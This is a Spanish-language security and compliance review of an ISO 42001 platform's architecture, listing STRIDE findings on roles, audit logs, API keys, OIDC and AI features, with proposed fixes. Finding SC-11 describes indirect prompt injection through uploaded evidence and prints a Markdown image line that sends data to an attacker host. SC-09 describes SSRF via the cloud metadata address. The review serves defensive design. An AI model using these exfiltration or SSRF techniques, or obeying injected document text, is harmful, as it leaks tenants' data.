---
title: 'Revisión independiente — seguridad y cumplimiento del Architecture Spine'
subject: _bmad-output/planning-artifacts/architecture/architecture-ISO42001-2026-09-17/ARCHITECTURE-SPINE.md
lens: seguridad (STRIDE) + cumplimiento (CLAUDE.md, ISO/IEC 42001 auditabilidad)
reviewer: revisor independiente (headless)
date: '2026-09-17'
status: findings
inputs:
  - ARCHITECTURE-SPINE.md (completo)
  - CLAUDE.md (reglas no negociables y puntos de aprobación humana)
  - docs/architecture/SECURITY_ARCHITECTURE.md §1-§4, §8-§11, §14
  - docs/architecture/EVENT_ARCHITECTURE.md §3.1, §4 (ENTITY_MUTATED, outbox)
  - docs/architecture/DATA_ARCHITECTURE.md §12
  - docs/architecture/AI_ARCHITECTURE.md (grounding, redacción)
  - docs/decisions/ADR-011 (better-auth, peer deps)
  - addendum.md §B (matriz rol × permiso, líneas 226-276) y D.4
---

# Revisión de seguridad y cumplimiento — Architecture Spine ISO/IEC 42001

## 0. Veredicto

**No apto para bloquearse (lock) ni para un piloto con datos reales en su forma actual.** Los cimientos son correctos y coherentes con CLAUDE.md (RLS forzado, outbox en la misma transacción, cadena de hashes por tenant, `Approval` única, SoA por eventos, puntuaciones con desglose), pero la espina deja **tres huecos críticos de autorización y auditabilidad** que, implementados tal cual, permitirían (a) que un `Platform Administrator` o un `Read Only` externo lean datos de negocio que las reglas transversales dicen que no ven, (b) que un administrador de tenant esquive la independencia del auditor y la separación de funciones creando roles personalizados, y (c) que cualquier rol exporte el registro de auditoría completo con `before/after` de todas las entidades (incluidos datos personales) por tener `organization.read`. Además hay una docena de hallazgos altos en jobs multi-tenant, proyección de búsqueda, API keys, OIDC (SSRF), secretos de producción en el MVP, IA asistida y separación de funciones. Ninguno exige rehacer el paradigma: todos se cierran endureciendo `Rule` de AD existentes o añadiendo tres AD nuevas (AD-24 a AD-26, §5).

Calificación por área:

| Área | Estado | Motivo |
| --- | --- | --- |
| A. Seguridad (STRIDE) | **Insuficiente** | 2 críticos + 8 altos; la mayor parte son huecos "entre AD" (jobs, proyecciones, dead_letter, API keys, OIDC) que ningún AD ata |
| B. Cumplimiento CLAUDE.md | **Aceptable con correcciones** | No inventa cláusulas ni texto literal; nunca declara "certificado"; la IA no escribe. Faltan: prohibición explícita de transición automática de `RequirementImplementation`, archivo de evidencia sin `Approval`, cobertura de términos prohibidos en artefactos de IA e informes, y la lista de decisiones de seguridad pendientes de aprobación humana dentro de la espina |
| C. SoD y auditabilidad | **Insuficiente** | La excepción D.4 es manipulable; el aprobador puede perderse al ejecutar la transición por evento; el principal `system` no está definido; un evento de auditoría puede descartarse en `dead_letter` sin que la cadena lo detecte |

## 1. Método

Se leyó la espina completa (AD-1..AD-23, convenciones, stack, semilla, mapa y diferidos) y se contrastó cada AD de seguridad (AD-2, AD-6, AD-8, AD-13, AD-14, AD-15, AD-17) con el modelo STRIDE de SECURITY_ARCHITECTURE §11, con la matriz del addendum §B y con las reglas no negociables de CLAUDE.md. Para cada amenaza propuesta en el encargo se buscó si alguna `Rule` de la espina la cierra de forma **comprobable** (prueba, invariante o privilegio de BD); si solo la cierra un documento compañero, se anota como hueco de la espina, porque la espina es lo que dos cambios OpenSpec construidos por separado deben respetar. No se modificó ningún archivo salvo este.

Convención de severidad: **critical** = fuga cross-tenant, escalada o pérdida de auditabilidad explotable con la espina tal cual; **high** = misma clase pero requiere condición adicional o afecta a un subconjunto; **medium** = debilidad de defensa en profundidad o ambigüedad que produciría implementaciones incompatibles; **low** = higiene.

## 2. Resumen de hallazgos

| ID | Sev. | AD | Título | Aprobación humana |
| --- | --- | --- | --- | --- |
| SC-01 | critical | AD-8 | La matriz §B contradice sus propias reglas transversales: `Platform Administrator` y `Read Only` reciben lectura de datos de negocio | Sí (D-6, S-5) |
| SC-02 | critical | AD-8 | Roles personalizables sin cota: la independencia del auditor y la SoD están ancladas al *nombre* del rol, no a la combinación de permisos | Sí |
| SC-03 | critical | AD-6 | Exportación/verificación del registro de auditoría sin permiso propio (`organization.read` = todos los roles) y con `before/after` completos, incluidos datos personales, en un almacén inmutable | Sí (privacidad) |
| SC-04 | high | AD-5, AD-6 | Cargas útiles de eventos copiadas a tablas pg-boss sin RLS; `dead_letter` visible cross-tenant; un evento de auditoría descartado deja la cadena "íntegra" pero incompleta | No |
| SC-05 | high | AD-2, AD-10, AD-6 | Principal `system` y jobs multi-tenant sin definir: enumeración de tenants, atribución del aprobador en transiciones ejecutadas por consumidor | No (técnico) |
| SC-06 | high | AD-10 | `SegregationOfDutiesException` manipulable (desactivar al otro aprobador) y sin límites por tipo de decisión | Sí (D.4, S-7, interpretación normativa) |
| SC-07 | high | AD-3, AD-15 | Proyección de búsqueda (cambio 22) hereda RLS pero no permisos: expone entidades que el actor no puede leer | No |
| SC-08 | high | AD-15 | API keys: alcances congelados en la creación, no intersectados con los permisos vigentes del creador ni ligados a la `Membership` | Sí (S-4) |
| SC-09 | high | AD-15, AD-14 | SSRF vía URL de descubrimiento OIDC configurada por el `Organization Administrator` (no cubierta por la lista de hosts de conectores) | Sí (arquitectura de seguridad) |
| SC-10 | high | AD-14 | `client_secret` OIDC de tenant es un secreto de producción **en el MVP** y el adaptador MVP es una sola clave maestra en variable de entorno | Sí (S-9, credenciales de producción) |
| SC-11 | high | AD-17 | Inyección indirecta de prompt vía *grounding* de texto autorado por usuarios/evidencia; exfiltración vía renderizado de Markdown; retención de datos del proveedor | Sí (F2, privacidad) |
| SC-12 | high | AD-9, AD-10 | La espina no prohíbe que un evento transicione `RequirementImplementation`/`ControlImplementation` a `Implemented`; solo lo prohíbe para la IA | Sí (interpretación normativa) |
| SC-13 | high | AD-6 | Ancla externa diferida a F2: en un piloto con datos reales el insider con privilegios de BD puede reescribir la cadena entera de forma consistente | Sí (S-14) |
| SC-14 | high | AD-11, AD-13 | Archivo (`evidence.delete`) de evidencia enlazada a controles activos sin `Approval`, sin comprobar `LegalHold` y con efecto silencioso en puntuaciones | Sí (CLAUDE.md: borrar o alterar evidencia) |
| SC-15 | medium | AD-13 | URL firmada = portador reutilizable; posible descarga de archivo con `scan_status = Pending` por API; sin evento de lectura/descarga | No |
| SC-16 | medium | AD-7, AD-23 | Integridad de la semilla: sin manifiesto firmado/hasheado ni registro del `sha256` cargado en la auditoría del tenant plataforma | Sí (interpretación normativa si cambia paráfrasis) |
| SC-17 | medium | AD-12 | La prueba de términos prohibidos no cubre artefactos de IA, plantillas de informe ni `ReportRun` renderizados | No |
| SC-18 | medium | AD-15 | Rate limiting y cabeceras seguras (exigidos por CLAUDE.md) ausentes de la espina; `Idempotency-Key` sin alcance definido | No |
| SC-19 | medium | AD-16 | `ScoreSnapshot` no vincula a Risk (riesgo residual), AIMS (checklist de preparación) ni Controls & SoA (madurez) | No |
| SC-20 | medium | AD-13, AD-9 | "Evidencia subida ≠ aceptada" no está formalizado: `Collected` (automático) vs `Accepted` (humano), vigencia y efecto en puntuaciones | Sí (interpretación normativa: vigencia) |
| SC-21 | medium | AD-18 | Anti-SSRF de conectores: lista de hosts insuficiente frente a subdominios por tenant, DNS rebinding y redirecciones | No |
| SC-22 | medium | Stack, AD-15 | better-auth: peer deps Prisma 5-7 vs Prisma 8 anunciado; tablas `users/sessions` globales y cambio de tenant activo sin re-evaluar MFA | Sí (S-1) |
| SC-23 | medium | — | La espina marca `[ADOPTED]` decisiones de arquitectura de seguridad (AD-13, AD-14, AD-15 auth) sin la marca "pendiente de aprobación humana" que CLAUDE.md exige | Sí (por definición) |
| SC-24 | low | AD-11 | `deleted_at` no lo filtra RLS: Reporting/búsqueda pueden resurtir borrados lógicos | No |
| SC-25 | low | AD-20 | Migraciones irreversibles sin punto de aprobación humana en la envolvente operativa | Sí (CLAUDE.md) |
| SC-26 | low | AD-6 | `session_metadata.ip` en almacén inmutable choca con retención mínima; `previous_hash` inicial predecible es aceptable pero debe documentarse como tal | Sí (privacidad) |

Total: 3 critical, 11 high, 9 medium, 3 low.

## 3. Hallazgos detallados

### A. Seguridad

#### SC-01 — critical — AD-8 — La matriz por defecto contradice las reglas transversales (PA y RO)

**Evidencia.** AD-8: "La matriz por defecto es addendum §B". En §B, `Platform Administrator` tiene **X** en `requirements.read`, `controls.read`, `soa.read`, `risks.read`, `ai_systems.read`, `assessments.read`, `evidence.read`, `audits.read`, `reports.read`, `integrations.read`, `policies.read`, `management_review.read`, además de `users.manage` y `roles.manage` (puede invitarse a sí mismo como OA en cualquier tenant). La regla transversal (1) dice lo contrario: "**no** ve datos de negocio de los tenants por defecto". `Read Only` tiene **X** en `risks.read`, `audits.read`, `management_review.read`, `assessments.read`, `ai_systems.read`; la regla (4) dice "ve solo paquete de evidencia, SoA e informes". Dos cambios OpenSpec (3 `identity-and-rbac` y 13 `evidence-library`) leerán la tabla, no la prosa.

**Amenaza.** I/E: revelación cross-tenant estructural (el PA opera sobre todos los tenants) y revelación a un tercero externo (RO invitado). Rompe también la pretensión de que la plataforma sea auditable: un auditor de certificación preguntará quién puede leer qué.

**Propuesta (Rule endurecida AD-8).**
- "El `Platform Administrator` **no tiene `Membership` en ningún tenant de cliente**; sus permisos son exclusivamente `standards.manage`, `tenants.manage` (crear, suspender, asignar el primer `Organization Administrator` en la creación) y `platform.observe` (métricas sin contenido). Toda acción del PA sobre un tenant se audita **en la cadena del tenant afectado y en la del tenant plataforma**. El acceso de soporte solo existe vía `SupportAccessGrant` (S-6)."
- "La fila PA y la fila RO de la matriz §B se corrigen antes del cambio 3: PA sin lecturas de negocio; RO solo `evidence.read (paquete)`, `soa.read`, `reports.read`, con `Membership.expires_at` obligatorio."
- "Una prueba de `tests/security` deriva la matriz efectiva del catálogo y falla si PA o RO obtienen un permiso fuera de su lista cerrada."

**Aprobación humana:** sí (D-6/S-5, y S-6). Marcar la corrección de la matriz como bloqueante del cambio 3.

#### SC-02 — critical — AD-8 — Roles personalizables sin cota de escalada ni invariantes por permiso

**Evidencia.** AD-8: "los roles son personalizables por tenant". SECURITY §2: las reglas de independencia (2) y (3) están formuladas sobre `Auditor` y `Reviewer` **por nombre de rol**; `assignRoles` rechaza "la combinación" para el rol `Auditor`. Un `Organization Administrator` (`roles.manage`, `users.manage`) puede crear el rol `Audit Lead` con `audits.execute + evidence.approve + controls.manage`, o darse a sí mismo `soa.approve + risks.accept + policies.approve` y, con una segunda cuenta que él mismo invita, cumplir `decided_by ≠ requested_by`.

**Amenaza.** E: escalada vertical por el propio tenant; colapso de la separación de funciones (PR-DR-011) y de la independencia del auditor (ISO 19011). El registro de auditoría lo dejaría visible, pero la espina prometía **prevenir**, no solo detectar.

**Propuesta (Rule endurecida AD-8 + nueva AD-26 "Gobierno de roles").**
- "Las invariantes de separación se expresan sobre **conjuntos de permisos**, no sobre nombres de rol: `INCOMPATIBLE_PERMISSION_SETS` en `packages/kernel/permissions.ts` (p. ej. `{audits.execute} × {controls.manage, evidence.upload, evidence.approve, soa.manage}`, `{evidence.upload} × {evidence.approve}` sobre el mismo alcance, `{roles.manage} × {soa.approve, risks.accept, policies.approve, management_review.approve}`). El `Authorizer` y `assignRoles`/`createRole` rechazan cualquier rol o asignación efectiva que viole un par."
- "Permisos **reservados** no asignables a roles personalizados: `standards.manage`, `tenants.manage`, `roles.manage`, `audit_trail.export`, `administration.jobs.manage`."
- "Crear o modificar un rol y conceder cualquier permiso `*.approve|accept|activate` pasa por `Approval` (AD-10) de un segundo `Organization Administrator` o `Executive`; la asignación se aplica al recibir `APPROVAL_GRANTED`."
- "Un permiso concedido a un rol personalizado no puede exceder la unión de permisos del rol del actor que lo crea (no delegar lo que no se tiene)."
- Prueba de escalada en `tests/security`: cada rol de la matriz intenta cada mutación de rol; solo las combinaciones permitidas pasan.

**Aprobación humana:** sí (arquitectura de seguridad y política de SoD del producto).

#### SC-03 — critical — AD-6 — Exportación del registro de auditoría con `organization.read` y datos personales en `before/after`

**Evidencia.** AD-6: "Verificación y exportación por API/UI" sin permiso propio; SECURITY §9: "es un `ReportRun` con permiso `organization.read`". En §B, `organization.read` lo tienen **los 12 roles**, incluido `Read Only` invitado externo. `audit_entries.previous_state/new_state` y `ENTITY_MUTATED.before/after` son snapshots canónicos completos (EVENT §3.1) de entidades como `Stakeholder` (datos de contacto), `User`/`Membership`, `Incident`, `ImpactAssessment`; `session_metadata` incluye `ip`. El almacén es append-only, nunca se purga y su hash cubre esos campos.

**Amenaza.** I (revelación masiva a cualquier miembro y a auditores externos), y conflicto con minimización/derecho de supresión: un dato personal escrito en un snapshot no puede ni corregirse ni borrarse sin romper la cadena. Para una plataforma que gobierna IA y evaluará impactos sobre personas, es un hallazgo de auditoría seguro.

**Propuesta (Rule endurecida AD-6 + nueva AD-25 "Datos personales en eventos y auditoría").**
- "Permisos nuevos `audit_trail.read`, `audit_trail.verify`, `audit_trail.export`; por defecto OA, GM, CM, AU (lectura/verificación) y solo OA/CM (exportación). RO y PA: ninguno. La exportación emite `AUDIT_TRAIL_EXPORTED { actor, filtro, sha256 }`."
- "`before/after` contienen únicamente `changed_fields` con valores para **campos de cumplimiento** (estado, propietario, justificación, fechas, referencias); los campos anotados `@personal` en el esquema Zod de la entidad se registran **hasheados o tokenizados** (`hash_pii(value, tenant_pepper)`), nunca en claro. La lista de campos `@personal` es parte del contrato de cada entidad (prueba: ninguna entidad con `@personal` sin regla de tokenización)."
- "`session_metadata.ip` se almacena truncado (/24 IPv4, /48 IPv6) o cifrado con DEK por tenant (S-10); la clave puede destruirse al vencer la retención (cripto-borrado) sin tocar la cadena."
- Excepción explícita: cuando el dato personal **es** la decisión de cumplimiento (p. ej. `decided_by`), se conserva el identificador de usuario (uuid), nunca correo ni nombre.

**Aprobación humana:** sí (privacidad y arquitectura de seguridad).

#### SC-04 — high — AD-5 / AD-6 — Cargas útiles fuera de RLS y pérdida silenciosa de eventos de auditoría

**Evidencia.** AD-5: "Un relay mueve `outbox_events` a colas pg-boss (`events.<TYPE>`)"; SECURITY §3: "las cargas útiles de pg-boss incluyen `tenant_id`". Las tablas de pg-boss (`pgboss.job`, `pgboss.archive`) **no llevan RLS** y contendrían el envelope completo (incluido `before/after`). EVENT §12: el panel de `dead_letter` permite "descartar con motivo" con `administration.jobs.manage`. Si el evento descartado era el único eslabón de una mutación (p. ej. `ENTITY_MUTATED` que nunca llegó a `audit-trail-writer`), la mutación queda **sin rastro** y `audit-chain-verify` dirá `intact`.

**Amenaza.** I (lectura cross-tenant por quien vea `pgboss.*` o el panel), R (repudio: mutación sin entrada de auditoría) y T.

**Propuesta (Rule endurecida AD-5 y AD-6).**
- "La carga útil de un job pg-boss es **solo** `{ event_id, tenant_id, type }`; el consumidor relee `outbox_events` bajo `withTenant`. Ningún `payload` de dominio sale de tablas con RLS."
- "El consumidor `audit-trail-writer` es **no descartable**: no tiene `dead_letter`; sus fallos se reintentan indefinidamente con alerta a los 3 fallos y bloquean el avance del `sequence` del tenant (nada se salta)."
- "`audit-chain-verify` comprueba además `count(outbox_events where tenant_id) = count(audit_entries)` y que cada `outbox_events.id` tenga entrada; discrepancia = `broken` con `missing_event_ids[]`."
- "El panel de `dead_letter` se filtra por tenant activo del actor; descartar exige `reason` y produce `DEAD_LETTER_DISCARDED` que **sí** entra en la cadena."

**Aprobación humana:** no (técnico, dentro de ADR-003/005).

#### SC-05 — high — AD-2 / AD-10 / AD-6 — Principal `system` y jobs multi-tenant indefinidos

**Evidencia.** La espina menciona jobs (`retention-sweeper`, `audit-chain-verify`, relay, `evidence-scan`, `support-access-expirer`) pero no dice cómo un job que debe recorrer **todos** los tenants obtiene la lista bajo una política RLS que "fija tenant por transacción". SECURITY §2 solo dice "no existe un modo todos los tenants salvo `standards.manage`". Tampoco define `actor_id` cuando el contexto propietario ejecuta la transición "al recibir `APPROVAL_GRANTED`" (AD-10): si el consumidor corre como `system`, `audit_entries.actor_id` de `SOA_APPROVED` o `EVIDENCE_ACCEPTED` sería `system`, y el aprobador solo se recuperaría siguiendo `causation_id`.

**Amenaza.** E/T (un implementador añade un rol `BYPASSRLS` o un valor comodín para `app.tenant_id` "para el relay"), R (pérdida del aprobador en la entrada de auditoría del cambio de estado).

**Propuesta (nueva AD-24 "Principal `system` y jobs").**
- "Existe una tabla global `tenants` (sin RLS, `SELECT` para `app_rw`) que es la **única** fuente de enumeración. Un job global es siempre un *fan-out*: un job orquestador lee `tenants` y encola un job por tenant con `tenant_id` en la carga; el trabajo real ocurre siempre dentro de `withTenant`. Prohibido `BYPASSRLS`, prohibido cualquier valor comodín de `app.tenant_id`; la prueba de `pg_roles` lo verifica."
- "`actor_type ∈ { user, api_key, system, ai_assistant }`. Un evento emitido por `system` lleva `actor_id = job_name@version`. Cuando una transición deriva de una decisión humana (`APPROVAL_GRANTED`, `USER_INVITED`…), el evento derivado lleva `actor_id = decided_by`, `actor_type = user`, `on_behalf_of = system:<consumer>` y `causation_id` del evento de aprobación. **El principal `system` nunca es el actor de una decisión de cumplimiento** (aplicabilidad, aceptación de riesgo, aprobación de evidencia/política, cierre de CAPA); una prueba recorre el catálogo de eventos de decisión y lo verifica."
- "`system` no puede crear ni decidir `Approval`."

**Aprobación humana:** no (técnico), salvo la lista de "decisiones de cumplimiento", que ya está fijada por CLAUDE.md.

#### SC-07 — high — AD-3 / AD-15 — Proyección de búsqueda sin filtro de permisos

**Evidencia.** Mapa de capacidades, cambio 22: "proyección de búsqueda en `domain-reporting` `[ASSUMPTION]`", alimentada por `ENTITY_MUTATED` (EVENT §3.1). SECURITY §3.5: "hereda RLS". RLS aísla tenants, **no** roles: un `Control Owner` sin `management_review.read` encontraría fragmentos de actas de revisión por la dirección; un `Read Only` externo, descripciones de riesgos e incidentes.

**Amenaza.** I (revelación intra-tenant), y con FR-124 (semántica, F2) el vector se amplía.

**Propuesta (Rule endurecida AD-3).**
- "Toda fila de proyección (`search_documents`, `QueryModel`) lleva `required_permission` y, si aplica, `owner_id`/`business_unit_id`; la consulta de búsqueda aplica `Authorizer.filter(actor, rows)` **antes** de devolver fragmentos. Un resultado nunca incluye texto de una entidad que el actor no podría abrir; como mínimo se devuelve `{ entity_type, entity_id, restricted: true }`."
- "La prueba BOLA generada desde OpenAPI incluye `/search` con cada rol y verifica ausencia de fragmentos de entidades no legibles."

**Aprobación humana:** no.

#### SC-08 — high — AD-15 — API keys con alcances congelados y sin ligadura a la `Membership`

**Evidencia.** AD-15: "`Authorization: Bearer <api_key>` … resuelta a `TenantContext`". SECURITY §1: "`scopes ⊆` permisos del creador" (en la creación). No se dice qué pasa si el creador pierde permisos, cambia de rol o es desactivado en otro tenant, ni si una clave puede aprobar (`*.approve`) o si requiere el equivalente de MFA.

**Amenaza.** E (permisos vigentes mayores que los del dueño), S (una clave sobrevive a la desactivación si `FR-005 ≤ 60 s` solo revoca sesiones "personales").

**Propuesta (Rule endurecida AD-15).**
- "Una API key pertenece a una `Membership` (`tenant_id`, `user_id`). En cada petición, los permisos efectivos son `key.scopes ∩ permisosVigentes(membership)`; la clave muere con la `Membership` (desactivación, expiración, revocación) y su revocación es inmediata (validación contra BD, sin caché > 60 s)."
- "Las API keys **no pueden** ejercer permisos `*.approve`, `*.accept`, `soa.activate/deactivate`, `roles.manage` ni `audit_trail.export` `[ASSUMPTION política]`: las decisiones de cumplimiento exigen sesión interactiva con MFA."
- "Formato `iso42k_<prefix>_<secret>`, `SHA-256` en BD, caducidad máxima 12 meses, rotación con solapamiento, eventos `API_KEY_CREATED|ROTATED|REVOKED|USED_AFTER_REVOCATION`; rate limit por clave."

**Aprobación humana:** sí (S-4 y la política de "sin aprobaciones por API key" es decisión de producto).

#### SC-09 — high — AD-15 / AD-14 — SSRF vía configuración OIDC del tenant

**Evidencia.** SECURITY §1: "OIDC genérico … contra el proveedor de identidad del tenant, configurado por el `Organization Administrator`". El servidor resolverá `issuer` → `/.well-known/openid-configuration` → `jwks_uri`, `token_endpoint` desde `apps/web` (no desde el worker con egress restringido). La lista de hosts anti-SSRF (S-16) cubre solo conectores (AD-18).

**Amenaza.** S/I: un OA malicioso o comprometido apunta `issuer` a `http://169.254.169.254/` o a servicios internos (PostgreSQL, ClamAV, OTel) y usa las respuestas de error como oráculo.

**Propuesta (Rule endurecida AD-15 o nueva sección de AD-14).**
- "Toda URL configurable por un tenant (OIDC `issuer`, webhooks de notificación, endpoints de conector) pasa por `packages/kernel/net/egress-guard.ts`: solo `https`, resolución DNS previa con rechazo de rangos privados/link-local/loopback y de nombres que cambian de IP entre resolución y conexión (pin de IP), sin seguir redirecciones fuera del host, tiempo de espera ≤ 5 s, respuesta ≤ 1 MB. `jwks_uri` y `token_endpoint` deben compartir dominio registrable con `issuer`."
- "Cambiar la configuración OIDC exige `Approval` de un segundo OA y emite `IDP_CONFIGURATION_CHANGED`."

**Aprobación humana:** sí (arquitectura de seguridad; S-16 debe ampliarse a "toda URL saliente").

#### SC-10 — high — AD-14 — Secretos de producción en el MVP bajo una única clave maestra en entorno

**Evidencia.** AD-14: "`env` cifrado con clave maestra en dev/CI, KMS/Vault en producción, F2". Pero el MVP ya guarda secretos de terceros de producción: `client_secret` OIDC de cada tenant (cambio 3), SMTP, y opcionalmente la `LLMProviderConfig`. SECURITY §4 confirma `SECRETS_MASTER_KEY` única. Diferidos: "KMS/Vault concreto … antes de credenciales de producción de conectores (F2)" ignora las credenciales OIDC.

**Amenaza.** I: la fuga de una variable de entorno (volcado de proceso, imagen, CI) descifra los secretos de **todos** los tenants; no hay rotación de clave maestra definida.

**Propuesta (Rule endurecida AD-14).**
- "Cifrado de sobre desde el MVP: una DEK por tenant, envuelta por la clave maestra; `rotateMasterKey` reenvuelve DEKs sin re-cifrar valores. La clave maestra nunca se lee fuera de `packages/secrets`."
- "Condición explícita en Deferred: **ningún entorno con secretos de terceros reales (OIDC incluido) sale de `local|ci` sin KMS/Vault**, o bien se acepta el riesgo por escrito (aprobación humana, CLAUDE.md 'credenciales de producción')."

**Aprobación humana:** sí (S-9).

#### SC-11 — high — AD-17 — Inyección indirecta de prompt y exfiltración (F2)

**Evidencia.** AD-17 cubre proveedor abstraído, registro, `*.suggest` y validación de referencias normativas. AI_ARCHITECTURE §4 inyecta *grounding* leído por puertos con los permisos del invocador, y F2-19 analiza contenido de evidencia. Nada en la espina trata: (a) texto de entrada autorado por otros usuarios o por documentos subidos que contenga instrucciones al modelo; (b) cómo se renderiza la salida (Markdown con imágenes remotas = canal de exfiltración `![](https://attacker/?q=<datos>)`); (c) si el principal `ai-assistant` puede invocar herramientas o red; (d) retención/entrenamiento en el proveedor.

**Amenaza.** T/I: una evidencia PDF con texto oculto altera una `gap_analysis` para ocultar una brecha (integridad de cumplimiento) o induce a incluir datos de otros riesgos en la salida.

**Propuesta (Rule endurecida AD-17).**
- "`LLMProvider` no expone *tool use* ni acceso a red al modelo; la única salida aceptada es un esquema Zod estructurado por `AITaskType`; el texto libre se renderiza como texto plano o Markdown **sanitizado sin imágenes ni enlaces remotos**; ningún artefacto de IA se inyecta en HTML de informes sin escapado."
- "Todo *grounding* se envuelve en delimitadores con `source_ref` y el prompt de sistema declara que el contenido es dato; el contenido de evidencia (F2-19) se limita a texto extraído por el worker aislado, con `redaction_profile` aplicado y `data_classification_allowed`."
- "`LLMProviderConfig` exige proveedor con **no retención/no entrenamiento** contractual (`zero_data_retention: true`) para clasificaciones distintas de `public`; en su defecto la tarea se rechaza con `AI_PROVIDER_POLICY_REQUIRED`."
- "`review_status` de `AIGeneratedArtifact` solo lo cambia un `user` con el permiso de revisor de la tarea; `ai-assistant` no puede escribirlo (ampliar la prueba de `*.suggest`)."

**Aprobación humana:** sí (F2, privacidad y contratación de proveedor).

#### SC-13 — high — AD-6 — Ancla externa diferida frente a insider con privilegios

**Evidencia.** Deferred: "Verificación interna cubre MVP; ancla diaria exportable F2". La cadena detecta manipulación por quien **no** puede recalcular hashes; un operador con acceso a la BD (o una restauración de backup) puede reescribir y recalcular toda la cadena de un tenant de forma consistente. El pipeline prevé pilotos con datos reales antes de F2 (S-17).

**Amenaza.** T/R con privilegios de plataforma; la propia plataforma dejaría de ser auditable frente a su operador.

**Propuesta (Rule endurecida AD-6, coste bajo).**
- "Desde el cambio 4: `audit-chain-anchor` diario escribe `{ tenant_id, last_sequence, last_hash, at }` en el `ObjectStorage` con **Object Lock / WORM** en prefijo `anchors/`, y envía el mismo resumen por correo al `Organization Administrator` (y opcionalmente al `Executive`) como custodia fuera de la BD. La verificación compara con el último ancla; discrepancia = `broken`."
- Mantener el ancla externa "pública" (TSA, blockchain, notario) como F2.

**Aprobación humana:** sí (S-14).

#### SC-15 — medium — AD-13 — URL firmada portadora, descarga de archivo no escaneado y sin evento de lectura

**Evidencia.** AD-13: URL firmada ≤ 15 min con permiso verificado al **emitirla**; nada la liga a la sesión ni al actor; AD-13 exige escaneo "antes de que la evidencia pase a `Collected`", pero no prohíbe emitir URL de un `EvidenceFile` con `scan_status = Pending|Infected` (la UI no lo ofrece; la API sí podría). No hay evento de descarga/lectura, relevante para invitados externos y para R.

**Propuesta.** "`ObjectStorage.signedUrl` exige `scan_status = Clean`; la URL incluye `response-content-disposition: attachment` y `response-content-type` fijado desde el MIME verificado (nunca `text/html`); caducidad ≤ 5 min para RO externos; cada emisión produce `EVIDENCE_DOWNLOAD_REQUESTED { actor, file, sha256 }`." Sin aprobación humana.

#### SC-16 — medium — AD-7 / AD-23 — Integridad y procedencia de la semilla

**Evidencia.** AD-7: "se cargan solo desde `packages/standards-seed` (semver)"; SECURITY §3.3: escribe con `app_migrator` en despliegue. No hay manifiesto con `sha256` por archivo, ni registro en auditoría de qué versión y hash se publicó, ni verificación en arranque de que el catálogo en BD coincide con el paquete. La prueba anti-literal (D.5) compara contra `resumenes/`, que ya son paráfrasis; la única defensa real contra texto literal de la norma es la revisión humana registrada por versión.

**Propuesta.** "`standards-seed` publica `manifest.json { version, files: { path: sha256 }, reviewed_by, reviewed_at }`; el loader verifica los hashes y rechaza carga sin `reviewed_by`; publica `STANDARD_VERSION_PUBLISHED { version, manifest_sha256 }` en la cadena del tenant plataforma; `audit-chain-verify` del tenant plataforma recalcula el hash del catálogo en BD y lo compara con el manifiesto (`CATALOG_DRIFT` si difiere)." Aprobación humana: sí si cambia paráfrasis o identificadores (CLAUDE.md).

#### SC-18 — medium — AD-15 — Rate limiting, cabeceras y alcance de `Idempotency-Key`

**Evidencia.** CLAUDE.md exige "cabeceras seguras; rate limiting"; AD-15 no los menciona (viven solo en SECURITY §6-§7). `Idempotency-Key` "obligatorio en POST que crean" sin alcance: si la clave se indexa globalmente, un actor de otro tenant que adivine la clave recibiría la respuesta almacenada del primero.

**Propuesta.** Añadir a AD-15: "`Idempotency-Key` se almacena como `(tenant_id, actor_id, route, key)` con RLS y TTL 24 h; colisión con cuerpo distinto = `409 IDEMPOTENCY_MISMATCH`. Rate limiting por IP, sesión, API key y tenant y cabeceras (CSP con nonces, HSTS, `frame-ancestors 'none'`, `Permissions-Policy`) son parte del contrato de `defineRoute`; una prueba de arquitectura falla si un handler no pasa por `defineRoute`." Sin aprobación humana (valores en S-11/S-12 sí).

#### SC-21 — medium — AD-18 — Anti-SSRF de conectores incompleta (F2)

**Evidencia.** SECURITY §11: "lista de hosts de proveedor por adaptador; sin URL libre". Azure AI Foundry/OpenAI usan subdominios por recurso (`<recurso>.openai.azure.com`); una lista fija obliga a comodines y reabre DNS rebinding/redirecciones.

**Propuesta.** Reutilizar `egress-guard` de SC-09: patrones de host por adaptador **más** resolución y pin de IP, rechazo de redirecciones a otro host, y egress del worker limitado por red a los CIDR del proveedor donde sea posible. Sin aprobación humana adicional a S-16.

#### SC-22 — medium — Stack / AD-15 — better-auth y sesiones multi-tenant

**Evidencia.** ADR-011: peer deps de better-auth declaran Prisma 5-7; la espina pinnea Prisma 7.10 y anticipa Prisma 8 → riesgo de bloqueo de migración. Tablas `users`, `sessions` globales con `active_tenant_id`: cambiar de tenant activo debe re-evaluar la `Membership`, la política de MFA del tenant destino y la caducidad; no está en la espina.

**Propuesta.** "La autenticación se consume por un puerto `AuthProvider` en `packages/kernel` (verificar sesión, MFA, vincular OIDC); better-auth es adaptador reemplazable. `switchTenant` es un command que exige `Membership` activa, re-verifica MFA si el tenant destino lo exige y emite `SESSION_TENANT_SWITCHED`; el `TenantContext` se deriva de la sesión en cada petición, nunca de un parámetro del cliente." Aprobación humana: sí (S-1).

### B. Cumplimiento con CLAUDE.md

Comprobaciones directas:

| Regla CLAUDE.md | Resultado | Notas |
| --- | --- | --- |
| No inventar cláusulas/controles/texto normativo | **Cumple** | AD-7 fija catálogo desde semilla con cita `resumenes/NN §sección`, `SOURCE_DETAIL_REQUIRED`; AD-23 prueba 38 controles con distribución, 26 términos, 11 objetivos, 7 fuentes, cero texto literal. Hueco de procedencia: SC-16 |
| Texto literal de la norma | **Cumple** | "Ningún registro del catálogo lleva texto literal" (AD-7); la IA inyecta solo paráfrasis (AI §4) |
| Nunca declarar "certificado" | **Cumple parcialmente** | AD-12 prueba cadenas en recursos y API; no cubre artefactos de IA ni plantillas/`ReportRun` (SC-17). Añadir `compliant with ISO`, `conforme a ISO 42001` como sinónimos a la lista (ampliación pendiente de decisión de producto) |
| La IA sugiere; una persona aprueba | **Cumple** | AD-17 `*.suggest` con prueba; falta blindar `review_status` (SC-11) |
| Sin borrado silencioso de registros de cumplimiento | **Cumple parcialmente** | AD-11 `deleted_at + evento`; AD-21 purga con `Approval` (F2). Pero archivar evidencia enlazada a controles activos no exige `Approval` ni comprueba `LegalHold` (SC-14) |
